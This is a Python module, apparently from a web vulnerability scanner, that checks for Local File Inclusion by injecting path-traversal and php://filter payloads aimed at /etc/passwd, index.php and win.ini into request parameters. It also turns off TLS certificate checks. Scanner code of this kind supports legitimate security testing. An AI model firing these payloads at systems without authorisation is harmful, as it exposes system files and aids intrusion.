import re
from typing import List, Any, Dict

import requests

from src.core.request_rebuilder import rebuild_attack_request
from src.core.vulnerability import Vulnerability
from src.scanners.IScanModule import IScanModule, RequestNode, InjectionPoint

OASTClient = Any


class LfiModule(IScanModule):
    """Detecta LFI/RFI basico com payloads comuns."""

    PAYLOADS = {
        "../../../../../../etc/passwd": "root:x:0:0",
        "../etc/passwd": "root:x:0:0",
        "....//....//etc/passwd": "root:x:0:0",
        "php://filter/convert.base64-encode/resource=index.php": "PD9waHA",
        "file:///etc/passwd": "root:x:0:0",
        "C:\\windows\\win.ini": "for 16-bit app support",
        "....\\\\....\\\\windows\\\\win.ini": "for 16-bit app support"
    }

    def run_test(
        self,
        request_node: RequestNode,
        injection_point: InjectionPoint,
        oast_client: OASTClient
    ) -> List[Vulnerability]:
        relevant_locations = {'QUERY', 'BODY_FORM', 'BODY_JSON'}
        if injection_point['location'] not in relevant_locations:
            return []

        session = requests.Session()
        session.verify = False
        session.timeout = 5

        for payload, indicator in self.PAYLOADS.items():
            try:
                request_to_send = rebuild_attack_request(request_node, injection_point, payload)
                response = session.send(request_to_send, timeout=session.timeout)
                if indicator in (response.text or ""):
                    return [
                        Vulnerability(
                            name="Local File Inclusion (LFI)",
                            severity="High",
                            description=(
                                f"Possivel LFI em '{injection_point['parameter_name']}' com payload '{payload}'."
                            ),
                            evidence=indicator,
                            request_node_id=request_node['id'],
                            injection_point_id=injection_point['id']
                        )
                    ]
            except requests.exceptions.RequestException:
                continue
            except Exception:
                return []

        return []
